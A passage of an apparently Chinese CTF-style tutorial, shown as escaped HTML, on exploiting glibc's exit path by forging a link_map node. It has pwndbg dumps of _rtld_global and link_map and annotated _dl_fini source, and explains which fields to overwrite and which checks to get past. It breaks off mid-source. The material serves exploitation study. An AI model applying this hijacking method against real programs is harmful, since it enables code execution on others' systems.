class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p &amp;amp;_rtld_global&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; rtld_global *) &lt;span class=&#34;number&#34;&gt;0x7f56e43b9040&lt;/span&gt; &amp;lt;_rtld_global&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//以下是结构体信息的展开，pwndbg为我们做了整理&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p _rtld_global&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _dl_ns = &amp;#123;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      _ns_loaded = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba220&lt;/span&gt;,				&lt;span class=&#34;comment&#34;&gt;//#1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      _ns_nloaded = &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,						&lt;span class=&#34;comment&#34;&gt;//#2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      _ns_main_searchlist = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba4e0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      _ns_global_scope_alloc = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      _ns_global_scope_pending_adds = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      libc_map = &lt;span class=&#34;number&#34;&gt;0x7f56e4382000&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      _ns_unique_sym_table = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        lock = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          mutex = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            __data = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __lock = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __count = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __owner = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __nusers = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __kind = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __spins = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __elision = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              __list = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                __prev = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                __next = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            __size = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;\001&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\000&amp;#x27;&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;22&lt;/span&gt; times&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            __align = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;....    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;//展开数据会很多，但是只是对链表个节点信息的汇总&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们需要关注的是，&lt;/p&gt;
&lt;p&gt;​	#1，_ns_loaded = 0x7f56e43ba220,	这是整个链表的头节点，&lt;/p&gt;
&lt;p&gt;​	#2， _ns_nloaded = 4, 这里知名个这个链表的节点个数，在 exit 后面加载的检查中，会要求_ns_nloaded 链表的节点不少于 3 个&lt;/p&gt;
&lt;p&gt;（后面我会给出相关的源码）&lt;/p&gt;
&lt;p&gt;然后对于每个节点，都是 link_map 结构体，我们利用第一个节点做一下简单说明 (省略了部分无关的数据)&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; link_map *)&lt;span class=&#34;number&#34;&gt;0x7f56e43ba220&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_addr = &lt;span class=&#34;number&#34;&gt;94172888551424&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_name = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba7c8&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_ld = &lt;span class=&#34;number&#34;&gt;0x55a655922000&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_next = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba7d0&lt;/span&gt;,			&lt;span class=&#34;comment&#34;&gt;//#3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_prev = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;,							&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_real = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba220&lt;/span&gt;,			&lt;span class=&#34;comment&#34;&gt;//#3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_ns = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_libname = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba7b0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_info = &amp;#123;&lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922010&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a6559220f0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a6559220e0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922090&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a6559220a0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922120&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922130&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922140&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a6559220b0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a6559220c0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922020&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922030&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922100&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a6559220d0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922110&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922160&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922040&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922060&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922050&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922070&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922000&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922150&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922180&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922170&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922160&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a6559221a0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922190&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt; &amp;lt;repeats &lt;span class=&#34;number&#34;&gt;25&lt;/span&gt; times&amp;gt;, &lt;span class=&#34;number&#34;&gt;0x55a655922080&lt;/span&gt;&amp;#125;,			&lt;span class=&#34;comment&#34;&gt;//#4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_phdr = &lt;span class=&#34;number&#34;&gt;0x55a65591d040&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_direct_opencount = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_type = lt_executable,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_relocated = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_init_called = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,					&lt;span class=&#34;comment&#34;&gt;//#5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_global = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们需要关注的：&lt;/p&gt;
&lt;p&gt;​	#3，l_next = 0x7f56e43ba7d0, ，指向下一个 link_map 的指针，我们就是通过修改这个，将下一个节点劫持为我们伪造的 link_map&lt;/p&gt;
&lt;p&gt;​	#4 , l_real = 0x7f56e43ba220 , 指向的的自身的地址，这里也是后面需要检查的地方。&lt;/p&gt;
&lt;p&gt;​	#5,  l_init_called = 1, 简单说，就是为了绕过检查。&lt;/p&gt;
&lt;p&gt;下面是_dl_fini 函数的源码（我已经删除了部分注释及代码，源码路径为 glibc2.34/elf/dl-fini。c）&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_dl_fini (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;link_map&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;maps&lt;/span&gt;[&lt;span class=&#34;title&#34;&gt;nloaded&lt;/span&gt;];&lt;/span&gt;				&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;link_map&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;l&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  assert (nloaded != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; || GL(dl_ns)[ns]._ns_loaded == &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (l = GL(dl_ns)[ns]._ns_loaded, i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; l != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;; l = l-&amp;gt;l_next)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &lt;span class=&#34;comment&#34;&gt;/* Do not handle ld.so in secondary namespaces.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (l == l-&amp;gt;l_real)						&lt;span class=&#34;comment&#34;&gt;//检查节点的地址是否跟自己结构体保存的一致&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		assert (i &amp;lt; nloaded);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		maps[i] = l;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		l-&amp;gt;l_idx = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		++i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;/* Bump l_direct_opencount of all objects so that they&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;		   are not dlclose()ed from underneath us.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		++l-&amp;gt;l_direct_opencount;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  assert (ns != LM_ID_BASE || i == nloaded);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; nmaps = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			 &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  __rtld_lock_unlock_recursive (GL(dl_load_lock));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; nmaps; ++i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;link_map&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;l&lt;/span&gt; =&lt;/span&gt; maps[i];			&lt;span class=&#34;comment&#34;&gt;//l遍历link_map的链表&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (l-&amp;gt;l_init_called)					&lt;span class=&#34;comment&#34;&gt;//重要的检查点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		  l-&amp;gt;l_init_called = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;						&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		  &lt;span class=&#34;comment&#34;&gt;/* Is there a destructor function?  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (l-&amp;gt;l_info[DT_FINI_ARRAY] != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		      || (ELF_INITFINI &amp;amp;&amp;amp; l-&amp;gt;l_info[DT_FINI] != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		      &lt;span class=&#34;comment&#34;&gt;/* When debugging print a message first.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__builtin_expect (GLRO(dl_debug_mask)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					    &amp;amp; DL_DEBUG_IMPCALLS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			_dl_debug_printf (&lt;span class=&#34;string&#34;&gt;&amp;quot;\ncalling fini: %s 